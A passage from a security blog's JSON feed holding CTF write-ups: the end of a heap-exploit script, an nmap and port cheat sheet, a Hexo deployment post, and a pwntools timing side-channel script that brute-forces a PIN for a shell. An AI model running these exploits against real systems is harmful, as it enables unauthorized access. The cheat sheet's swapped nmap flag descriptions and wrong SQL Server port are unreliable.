<span class=\"token operator\">+</span> <span class=\"token number\">0x9960</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x9ac8</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>payload <span class=\"token operator\">=</span> ind <span class=\"token operator\">*</span> <span class=\"token string\">b'a'</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Please type your guessing flag\"</span><span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'***: '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'&#125;'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": [
                "heap",
                "overlap",
                "unlink"
            ]
        },
        {
            "id": "http://waltcsz.github.io/2023/11/awdtools/",
            "url": "http://waltcsz.github.io/2023/11/awdtools/",
            "title": "awdTools",
            "date_published": "2023-11-02T15:39:19.000Z",
            "content_html": "<h1 id=\"端口扫描\"><a class=\"markdownIt-Anchor\" href=\"#端口扫描\">#</a> 端口扫描</h1>\n<h2 id=\"nmap\"><a class=\"markdownIt-Anchor\" href=\"#nmap\">#</a> nmap</h2>\n<p>nmap [scan type] [option] [target]</p>\n<p>命令\t描述<br>\n nmap IP\t扫描 IP<br>\nnmap -v IP\t加强扫描<br>\n nmap IP1 IP2 …\t扫描多 IP<br>\nnmap a.b.c.*\t扫描整个子网<br>\n nmap a.b.c.x,y,…\t扫描多子网地址<br>\n nmap -iL xxx.txt\t根据文件扫描多 IP<br>\nnmap a.b.c.x-y\t扫描子网 IP 范围<br>\n nmap a.b.c.* --exclude IP\t排除指定 IP 扫描整个子网<br>\n nmap -A IP\t扫描操作系统和路由跟踪<br>\n nmap -O IP\t探测操作系统<br>\n nmap -sA/-PN IP\t探测防火墙<br>\n nmap -sP a.b.c.*\t探测在线主机<br>\n nmap -F IP\t快速扫描<br>\n nmap -r IP\t按顺序扫描<br>\n nmap -iflist\t显示接口和路由信息<br>\n nmap -p n1,n2… IP\t扫描指定端口<br>\n nmap -p T:n1,n2… IP\t扫描 TCP 端口<br>\n nmap -sU n1,n2… IP\t扫描 UDP 端口<br>\n nmap -sV IP\t查看服务的版本<br>\n nmap -PS IP\tTCP ACK 扫描<br>\n nmap -PA IP\tTCP SYN 扫描<br>\n nmap -sS IP\t隐蔽扫描<br>\n nmap -sN IP\tTCP 空扫描欺骗防火墙</p>\n<h1 id=\"流量监控\"><a class=\"markdownIt-Anchor\" href=\"#流量监控\">#</a> 流量监控</h1>\n<h2 id=\"sar\"><a class=\"markdownIt-Anchor\" href=\"#sar\">#</a> sar</h2>\n<ol start=\"2\">\n<li>sar 的使用</li>\n</ol>\n<p>sar 命令包含在 sysstat 工具包中，提供系统的众多统计数据。其在不同的系统上命令有些差异，某些系统提供的 sar 支持基于网络接口的数据统计，也可以查看设备上每秒收发包的个数和流量。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">[</span>sre@CDVM-213017031 ~<span class=\"token punctuation\">]</span>$ sar <span class=\"token parameter variable\">-n</span> DEV <span class=\"token number\">1</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Linux <span class=\"token number\">2.6</span>.32-431.el6.x86_64 <span class=\"token punctuation\">(</span>CDVM-213017031<span class=\"token punctuation\">)</span>  05/04/2017  _x86_64_ <span class=\"token punctuation\">(</span><span class=\"token number\">4</span> CPU<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre> </pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>08:05:30 PM  IFACE rxpck/s txpck/s rxkB/s txkB/s rxcmp/s txcmp/s rxmcst/s</pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>08:05:31 PM  lo  <span class=\"token number\">0.00</span>  <span class=\"token number\">0.00</span>  <span class=\"token number\">0.00</span>  <span class=\"token number\">0.00</span>  <span class=\"token number\">0.00</span>  <span class=\"token number\">0.00</span>  <span class=\"token number\">0.00</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>08:05:31 PM  eth0 <span class=\"token number\">1788.00</span> <span class=\"token number\">1923.00</span> <span class=\"token number\">930.47</span> <span class=\"token number\">335.60</span>  <span class=\"token number\">0.00</span>  <span class=\"token number\">0.00</span>  <span class=\"token number\">0.00</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre> </pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>08:05:31 PM  IFACE rxpck/s txpck/s rxkB/s txkB/s rxcmp/s txcmp/s rxmcst/s</pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>08:05:32 PM  lo  <span class=\"token number\">0.00</span>  <span class=\"token number\">0.00</span>  <span class=\"token number\">0.00</span>  <span class=\"token number\">0.00</span>  <span class=\"token number\">0.00</span>  <span class=\"token number\">0.00</span>  <span class=\"token number\">0.00</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>08:05:32 PM  eth0 <span class=\"token number\">1387.00</span> <span class=\"token number\">1469.00</span> <span class=\"token number\">652.12</span> <span class=\"token number\">256.98</span>  <span class=\"token number\">0.00</span>  <span class=\"token number\">0.00</span>  <span class=\"token number\">0.00</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre> </pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>Average:  IFACE rxpck/s txpck/s rxkB/s txkB/s rxcmp/s txcmp/s rxmcst/s</pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>Average:   lo  <span class=\"token number\">0.00</span>  <span class=\"token number\">0.00</span>  <span class=\"token number\">0.00</span>  <span class=\"token number\">0.00</span>  <span class=\"token number\">0.00</span>  <span class=\"token number\">0.00</span>  <span class=\"token number\">0.00</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>Average:   eth0 <span class=\"token number\">1587.50</span> <span class=\"token number\">1696.00</span> <span class=\"token number\">791.29</span> <span class=\"token number\">296.29</span>  <span class=\"token number\">0.00</span>  <span class=\"token number\">0.00</span>  <span class=\"token number\">0.00</span></pre></td></tr></table></figure><p>命令后面 1 2 意思是：每一秒钟取 1 次值，取 2 次。</p>\n<p>DEV 显示网络接口信息</p>\n<p>另外，-n 参数很有用，他有 6 个不同的开关：DEV | EDEV | NFS | NFSD | SOCK | ALL ，其代表的含义如下：</p>\n<p>DEV 显示网络接口信息。<br>\nEDEV 显示关于网络错误的统计数据。<br>\nNFS 统计活动的 NFS 客户端的信息。<br>\nNFSD 统计 NFS 服务器的信息<br>\n SOCK 显示套接字信息<br>\n ALL 显示所有 5 个开关<br>\n参数说明：</p>\n<p>IFACE：LAN 接口<br>\n rxpck/s：每秒钟接收的数据包<br>\n txpck/s：每秒钟发送的数据包<br>\n rxbyt/s：每秒钟接收的字节数<br>\n txbyt/s：每秒钟发送的字节数<br>\n rxcmp/s：每秒钟接收的压缩数据包<br>\n txcmp/s：每秒钟发送的压缩数据包<br>\n rxmcst/s：每秒钟接收的多播数据包<br>\n rxerr/s：每秒钟接收的坏数据包<br>\n txerr/s：每秒钟发送的坏数据包<br>\n coll/s：每秒冲突数<br>\n rxdrop/s：因为缓冲充满，每秒钟丢弃的已接收数据包数<br>\n txdrop/s：因为缓冲充满，每秒钟丢弃的已发送数据包数<br>\n txcarr/s：发送数据包时，每秒载波错误数<br>\n rxfram/s：每秒接收数据包的帧对齐错误数<br>\n rxfifo/s：接收的数据包每秒 FIFO 过速的错误数<br>\n txfifo/s：发送的数据包每秒 FIFO 过速的错误数<br>\n这种方式简单，直观，推荐使用。</p>\n<h1 id=\"信息\"><a class=\"markdownIt-Anchor\" href=\"#信息\">#</a> 信息</h1>\n<h2 id=\"共享文件夹\"><a class=\"markdownIt-Anchor\" href=\"#共享文件夹\">#</a> 共享文件夹</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>vmhgfs-fuse .host:/ /mnt/hgfs</pre></td></tr></table></figure><h2 id=\"常见端口\"><a class=\"markdownIt-Anchor\" href=\"#常见端口\">#</a> 常见端口</h2>\n<p>ssh 22</p>\n<p>rdp 3389</p>\n<p>sql server 1443</p>\n<p>mysql 3306</p>\n",
            "tags": []
        },
        {
            "id": "http://waltcsz.github.io/2023/10/hexo%E9%83%A8%E7%BD%B2%E9%85%8D%E7%BD%AE/",
            "url": "http://waltcsz.github.io/2023/10/hexo%E9%83%A8%E7%BD%B2%E9%85%8D%E7%BD%AE/",
            "title": "hexo部署配置",
            "date_published": "2023-10-28T23:40:41.000Z",
            "content_html": "<h1 id=\"下载安装\"><a class=\"markdownIt-Anchor\" href=\"#下载安装\">#</a> 下载安装</h1>\n<p>该软件是在安装 Node.js 后使用 <code>npm install</code>  安装的。</p>\n<p>在官网下载 Node.js 后，新建文件夹，运行以下命令。</p>\n<figure class=\"highlight powershell\"><figcaption data-lang=\"PowerShell\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>npm install hexo-<span class=\"token function\">cli</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>hexo init</pre></td></tr></table></figure><h1 id=\"git配置\"><a class=\"markdownIt-Anchor\" href=\"#git配置\">#</a> Git 配置</h1>\n<p>git 由于之前配置过，所以维持原样。总归就是设置用户名和邮箱，添加登陆密钥。</p>\n<p>而后需要将 <code>_config.yml</code>  文件中的配置改为如下。</p>\n<figure class=\"highlight yaml\"><figcaption data-lang=\"YAML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token key atrule\">deploy</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token key atrule\">type</span><span class=\"token punctuation\">:</span> git</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token key atrule\">repository</span><span class=\"token punctuation\">:</span> git@github.com<span class=\"token punctuation\">:</span>WaltCSZ/waltcsz.github.io.git</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token key atrule\">branch</span><span class=\"token punctuation\">:</span> master</pre></td></tr></table></figure><p>这样之后就可以用 <code>hexo d</code>  将网页部署到 Github Page 了。</p>\n<h1 id=\"图片导入解决\"><a class=\"markdownIt-Anchor\" href=\"#图片导入解决\">#</a> 图片导入解决</h1>\n<p>首先为了方便自己管理， <code>_config.yml</code>  中我设置了 <code>post_asset_folder: true</code> 。这样每个 md 文件都会有个同目录下对应的文件夹，然后可以将 md 文件用到的图片都放进去。其次 typora 本身也可以设置使用相对目录。</p>\n<p>这听起来很好的。完美闭环。但是，在使用 <code>hexo g</code>  构建静态网页之后， <code>index.html</code>  文件是放在 <code>assets</code>  文件夹里的，也就是与图片等同级。导致引用超链接需要从 <code>./%&#123;filename&#125;/img.png</code>  变成 <code>./img.png</code> 。而 hexo 本身不会做这样的更改。（真不知道为啥设计了 <code>post_asset_folder</code>  选项而没考虑改路径）</p>\n<p>网上大部分人使用的方法是 hexo-assets-image 插件，而我选择了一招 typora 本身的功能。就是设置图片根目录。在文件头添加以下内容。</p>\n<figure class=\"highlight markdown\"><figcaption data-lang=\"markdown\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token front-matter-block\"><span class=\"token punctuation\">---</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token front-matter yaml language-yaml\"><span class=\"token key atrule\">typora-root-url</span><span class=\"token punctuation\">:</span> filename</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">---</span></span></pre></td></tr></table></figure><p>这样对于 typora 文件来说，引用图片的时候地址就均为 <code>./img.png</code>  了。但可能其他 markdown 软件不支持吧，暂时不管了，反正我也不用。</p>\n<p>然后修改 <code>scaffolds</code>  文件夹中的模板，在开头加入以下内容，这样使用 <code>hexo new post</code>  的时候，就可以自动添加图片根目录了。</p>\n<figure class=\"highlight markdown\"><figcaption data-lang=\"markdown\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>typora-root-url: <span class=\"token comment\">hexo部署配置</span></pre></td></tr></table></figure><blockquote>\n<p>选择这个方案的原因还是很多的。首先是修改路径的插件有些好像版本有些老，有些版本有漏洞。而自己写 JavaScript 脚本的话，虽说抄抄改改也就可以用了。但我又想到，md 文件里如果每个图片都带了 <code>./%&#123;filename&#125;</code> ，那改 md 文件名的时候可能又容易出错，所以索性选择修改根目录的方法了。</p>\n</blockquote>\n<h1 id=\"主题\"><a class=\"markdownIt-Anchor\" href=\"#主题\">#</a> 主题</h1>\n<p>我也是个有选择困难症的人。选了好久，选了个二次元和简洁风相妥协的 ShokaX 主题。</p>\n<h2 id=\"图片设置\"><a class=\"markdownIt-Anchor\" href=\"#图片设置\">#</a> 图片设置</h2>\n<p>该主题会优先使用 <code>source/_data/assets/</code>  文件夹里的图片来构建网站，包括但不限于头像，图标，付款码，轮换背景图等。将需要的图片按规范命名后放进去。</p>\n<h2 id=\"评论系统-waline\"><a class=\"markdownIt-Anchor\" href=\"#评论系统-waline\">#</a> 评论系统 waline</h2>\n<p>待施工</p>\n<h1 id=\"域名\"><a class=\"markdownIt-Anchor\" href=\"#域名\">#</a> 域名</h1>\n<p>有钱了再说。</p>\n",
            "tags": []
        },
        {
            "id": "http://waltcsz.github.io/2023/10/newstarctf2023-week5/",
            "url": "http://waltcsz.github.io/2023/10/newstarctf2023-week5/",
            "title": "newstarctf2023 week5",
            "date_published": "2023-10-23T06:07:01.000Z",
            "content_html": "<h1 id=\"newstarctf2023-week5\"><a class=\"markdownIt-Anchor\" href=\"#newstarctf2023-week5\">#</a> newstarctf2023 week5</h1>\n<h2 id=\"login\"><a class=\"markdownIt-Anchor\" href=\"#login\">#</a> login</h2>\n<p>brop 侧信道攻击</p>\n<p>存在栈溢出，但是有 canary。</p>\n<p>输入时可以用空格等空字符分隔输入，所以输入函数用的是 scanf，scanf 会在输入字符串后面自动添加 <code>'\\0'</code> ，所以无法爆破 canary。于是也没办法用栈溢出了。</p>\n<blockquote>\n<p>考虑过通过大量溢出覆盖栈高处的 TLS（Thread Local Storage）存储的 canary 值，但是好像先因为 scanf 输入字符过多崩溃了</p>\n</blockquote>\n<p>经 Lxxxt 爷指点，发现这道题是 2023 年全国信息安全大赛原题改编。要用的是侧信道攻击法，利用程序判断密码（或 PIN 码）正确与否的时间差来推测正确的密码（或 PIN）码。</p>\n<h3 id=\"原理\"><a class=\"markdownIt-Anchor\" href=\"#原理\">#</a> 原理</h3>\n<p>程序有 3 个功能：</p>\n<ol>\n<li>输入密码登陆系统</li>\n<li>注册账号，但是该功能是没用的。</li>\n<li>重置密码，输入 PIN6 位验证码。</li>\n</ol>\n<p>其中输入密码和输入 PIN 码都是使用字符串输入，而如果程序使用的判断正确与否的逻辑是，“若第 i 位不正确，直接跳出，否则继续判断 i+1 位”，那么，在前 i-1 位正确的情况下，第 i 位为错误返回的时间应该比第 i 位为正确返回的时间快。利用这段时间可以 “逐位” 爆破密码。</p>\n<p>因为 PIN 确定一定为 6 位数字，所以从爆破 PIN 入手。前提还有 PIN 码每次调用重置密码功能时不会重置。</p>\n<p>利用脚本爆破。</p>\n<h3 id=\"过程\"><a class=\"markdownIt-Anchor\" href=\"#过程\">#</a> 过程</h3>\n<p>6 位 PIN 码，从第一位开始 0~9 测试，后面 5 位直接置 0。每次输入时记下开始时间，收到内容后记下结束时间，算出时间差。为减小因网络因素等产生的误差，每个数字测试 10 次取平均值，平均时间差最长的即为该位正确值。由此类推继续爆破后面 5 位。</p>\n<p>如果中途返回的字符串不含 <code>&quot;Wrong code!&quot;</code> ，则说明已经爆破到正确的 PIN 码了。此时跳出爆破循环进入后续操作。</p>\n<p>输入正确的 PIN 码后，获得修改密码的机会。修改密码后在登陆功能处输入密码，即可 getshell。</p>\n<p><img data-src=\"./image-20231031224129185.png\" alt=\"image-20231031224129185\"></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> sys <span class=\"token keyword\">import</span> argv</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#context.log_level='debug'</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">s</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">sa</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">sl</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">sla</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">r</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">pr</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">ru</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">return</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">inter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">debug</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">get_addr</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">return</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">get_sb</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token keyword\">return</span> libc_base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> libc_base <span class=\"token operator\">+</span> <span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">b'/bin/sh\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">getpin</span><span class=\"token punctuation\">(</span>pin<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\tsubtime <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\tres <span class=\"token operator\">=</span><span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\t<span class=\"token keyword\">for</span> c <span class=\"token keyword\">in</span> a<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\t\tpin_o <span class=\"token operator\">=</span> pin<span class=\"token operator\">+</span>c<span class=\"token operator\">+</span><span class=\"token string\">'0'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token operator\">-</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>pin<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\t\t<span class=\"token builtin\">sum</span><span class=\"token operator\">=</span><span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\t\t<span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\t\t\tru<span class=\"token punctuation\">(</span><span class=\"token string\">'>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\t\t\tsl<span class=\"token punctuation\">(</span><span class=\"token string\">b'3'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\t\t\tru<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Input code:\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\t\t\tstart<span class=\"token operator\">=</span>time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\t\t\tsl<span class=\"token punctuation\">(</span>pin_o<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\t\t\trev<span class=\"token operator\">=</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">19</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span> <span class=\"token string\">b\"Wrong code!\"</span> <span class=\"token keyword\">in</span> rev<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">pass</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>\t\t\t<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>pin_o<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>\t\t\t\tp<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>\t\t\tend<span class=\"token operator\">=</span>time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>\t\t\t<span class=\"token builtin\">sum</span><span class=\"token operator\">+=</span><span class=\"token punctuation\">(</span>end<span class=\"token operator\">-</span>start<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>\t\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>pin_o<span class=\"token punctuation\">,</span><span class=\"token builtin\">sum</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>\t\tavgtime<span class=\"token operator\">=</span><span class=\"token builtin\">sum</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>avgtime<span class=\"token operator\">></span>subtime<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>\t\t\tsubtime<span class=\"token operator\">=</span>avgtime</pre></td></tr><tr><td data-num=\"56\"></td><td><pre>\t\t\tres<span class=\"token operator\">=</span>c</pre></td></tr><tr><td data-num=\"57\"></td><td><pre>\t<span class=\"token keyword\">return</span> res</pre></td></tr><tr><td data-num=\"58\"></td><td><pre>a<span class=\"token operator\">=</span><span class=\"token string\">'0123456789'</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>p<span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"node4.buuoj.cn\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">27984</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>pin<span class=\"token operator\">=</span><span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td 